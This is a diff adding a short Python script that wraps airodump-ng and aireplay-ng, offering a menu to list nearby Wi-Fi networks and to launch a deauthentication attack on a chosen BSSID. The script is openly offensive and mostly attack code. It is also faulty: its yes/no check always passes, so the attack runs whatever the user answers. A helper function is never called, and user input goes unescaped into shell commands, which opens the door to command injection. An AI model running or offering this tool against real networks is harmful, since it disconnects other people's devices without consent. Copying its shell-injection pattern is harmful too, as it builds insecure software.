@@ -1,0 +1,33 @@
+import os
+import subprocess
+import time
+
+def main():
+	#cmd = aireplay-ng -0 -a PLACEHOLDER placeholder -i placeholder
+	vSelect = input("[1] - Dump networks\n[2] - Deauthentication\nh4x0r$ ")
+	if vSelect == "1":
+		netIFace = str(input("Interface to dump Networks: "))
+		netDump = "airodump-ng " + netIFace
+		subprocess.call(netDump, shell=True)
+
+	elif vSelect == "2":
+		netBssid = str(input("[+] Network BSSID: "))
+		netThreads = str(input("[+] Thread Count: "))
+		netIFCONFIG = str(input("[+] Inteface: "))
+		deauthCommand = "aireplay-ng -0 -a " + netBssid + " " + netThreads + " -i " + netIFCONFIG
+		time.sleep(1)
+		print("[!] Starting..")
+		time.sleep(1)
+		netConformation = str(input("Are you sure this is correct?\nh4x0r$ " + deauthCommand))
+		if netConformation == "Yes" or "yes":
+			subprocess.call(deauthCommand, shell=True)
+		elif netConformation == "No" or "no":
+			print("[^] Returning home!")
+			time.sleep(1)
+			main()
+		else: 
+			print("Weve ran into an error in the processing of your Input, please retry!")
+			main()
+	def startExecute():
+		main()
+
